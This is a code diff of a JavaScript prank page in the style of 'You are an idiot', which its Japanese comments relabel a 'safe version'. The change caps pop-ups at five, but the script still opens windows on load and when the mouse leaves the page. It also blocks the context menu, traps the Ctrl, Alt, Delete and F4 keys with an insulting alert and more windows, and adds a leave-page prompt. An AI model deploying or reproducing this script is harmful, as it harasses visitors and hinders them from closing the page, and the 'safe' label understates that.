@@ -1,4 +1,5 @@
-// 最大5個までウィンドウを開く
+// ==== 安全版 you.js（最大5個） ====
+
 var maxWindows = 5;
 var openWindows = 0;
 
@@ -21,15 +22,13 @@ function changeTitle(title) {
 }
 
 function openWindow(url) {
-	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+	if (openWindows >= maxWindows) return; // 最大数チェック
+	window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+	openWindows++;
 }
 
 function proCreate() {
-	// 最大5個までに制限
-	for (var i = openWindows; i < maxWindows; i++) {
-		openWindow('lol.html');
-		openWindows++;
-	}
+	openWindow('lol.html'); // 上限チェックは openWindow 側で行う
 }
 
 function newXlt() {
@@ -72,33 +71,34 @@ function playBall() {
     }
 }
 
-/* [Oct 2021] Better code. */
+/* 初期化 */
 window.onload = function () {
 	flagRun = 1;
-	playBall();
-	bookmark(); // Internet Explorer only
-	return true;
-}
 
-window.onmouseout = function () {
-	proCreate();
-	return null;
+	// 最初に5個作る
+	for (var i=0; i<maxWindows; i++) {
+		openWindow('lol.html');
+	}
+
+	playBall();
+	bookmark(); // IE only
+	return true;
 };
 
-window.oncontextmenu = function(){
-	return false;
-}
+/* イベント */
+window.onmouseout = function () { proCreate(); return null; }
 
-window.onkeydown = function() {	
+window.oncontextmenu = function() { return false; }
+
+window.onkeydown = function(event) {	
 	var keyCode = event.keyCode;
-	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
-		alert("You are an idiot!"); 
+	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {
+		alert("You are an idiot!");
 		proCreate();
 	}
 	return null;
 }
 
 window.onbeforeunload = function() {
-	return "Are you an idiot?";
+    return "Are you an idiot?";
 };
-/* [Oct 2021] End of amendments. */
